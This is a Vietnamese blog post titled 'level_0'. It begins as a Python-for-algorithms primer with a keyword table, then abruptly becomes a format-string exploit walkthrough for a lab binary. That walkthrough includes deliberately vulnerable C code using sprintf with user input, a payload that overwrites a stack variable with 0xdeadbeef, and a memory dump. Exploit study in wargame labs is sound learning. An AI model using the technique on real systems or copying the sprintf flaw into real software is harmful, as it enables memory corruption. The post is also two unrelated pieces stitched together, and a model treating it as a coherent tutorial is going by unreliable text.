---
layout: post
title: level_0
---

## Python hay C/C++?

C/C++: khó viết khó đọc, nhưng chương trình viết ra thường tối ưu, chạy nhanh

Python: dễ viết dễ đọc, nhiều thư viện hỗ trợ

Mục tiêu là để học và hiểu về thuật toán, nên chỉ chú trọng vào việc đọc và viết code một cách thuận tiện nhất. Vì thế, hãy sử dụng Python

## Những thứ cơ bản nhất

### Keyword

<pre class="memory">
<span style="color:aqua">False</span>     await       <span style="color:aqua">else</span>       import      pass
<span style="color:aqua">None</span>      <span style="color:aqua">break</span>       except     <span style="color:aqua">in</span>          raise
<span style="color:aqua">True</span>      <span style="color:aqua">class</span>       finally    <span style="color:aqua">is</span>          <span style="color:aqua">return</span>
<span style="color:aqua">and</span>       <span style="color:aqua">continue</span>    <span style="color:aqua">for</span>        lambda      try
as        <span style="color:aqua">def</span>         from       nonlocal    <span style="color:aqua">while</span>
assert    del         global     <span style="color:aqua">not</span>         with
async     <span style="color:aqua">elif</span>        <span style="color:aqua">if</span>         <span style="color:aqua">or</span>          yield
</pre>

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Hàm đầu tiên được xem xét trong bài này là `sprintf`. Hàm này có tham số đầu tiên là một biến (pointer), tiếp theo là một formatted string, theo sau đó là các tham số để thay vào formatted string. `sprintf` hoạt động bằng cách phân tích formatted string đưa vào, sau đó sinh ra một chuỗi mới sẽ được lưu vào biến tham số.

Tương tự như trong các bài về exploit stack trước đây.
1. Biến `target` được lưu trên stack với địa chỉ `ebp - 0xc`. Biến này có 4 byte.
2. Biến `buffer` được lưu trên stack với địa chỉ `ebp - 0x4c`. Biến này có 64 byte.

2 biến này lắm kề này trên stack. Do đó, về cơ bản, chúng ta sẽ cần một formatted string có thể sinh ra 68 byte, trong đó 4 byte cuối sẽ chứa giá trị mong muốn của `target`. Để exploit format0, formatted string sẽ như sau.

```bash
python -c "print '%064d\xef\xbe\xad\xde'"
```

<pre class="memory">
0xbffff700:     <span style="color:springgreen">0xbffff71c</span>      <span style="color:springgreen">0xbffff978</span>      <span style="color:springgreen">0x080481e8</span>      0xbffff798
0xbffff710:     0xb7fffa54      0x00000000      0xb7fe1b28      <span style="color:aqua">0x30303030</span>
0xbffff720:     <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>
0xbffff730:     <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>
0xbffff740:     <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>      <span style="color:aqua">0x30303030</span>
0xbffff750:     <span style="color:aqua">0x31303030</span>      <span style="color:aqua">0x31353433</span>      <span style="color:aqua">0x38323133</span>      <span style="color:orangered">0xdeadbeef</span>
0xbffff760:     0xb7fd8300      0xb7fd7ff4      0xbffff788      0x08048444
</pre>